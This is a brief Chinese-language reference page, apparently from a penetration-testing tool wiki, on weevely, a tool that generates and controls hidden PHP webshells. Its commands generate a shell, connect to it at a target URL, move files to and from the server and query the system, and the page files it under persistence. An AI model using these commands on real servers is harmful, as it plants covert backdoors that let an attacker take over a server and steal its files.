# weevely

## 简介
隐蔽的 PHP webshell 生成和管理工具

## 核心参数
- `generate`: 生成 webshell
- 连接 URL 和密码

## 命令示例
```bash
# 生成 webshell
weevely generate password shell.php

# 连接到 webshell
weevely http://target.com/shell.php password

# 上传文件
weevely http://target.com/shell.php password
:file_upload /local/file.txt /remote/path/

# 下载文件
weevely http://target.com/shell.php password
:file_download /remote/file.txt /local/path/

# 执行系统命令
weevely http://target.com/shell.php password
:system_info
```

## 使用场景
生成和管理隐蔽的 PHP webshell

## 所属分类
- [持久化 (Persistence)](../categories/19-persistence.md)
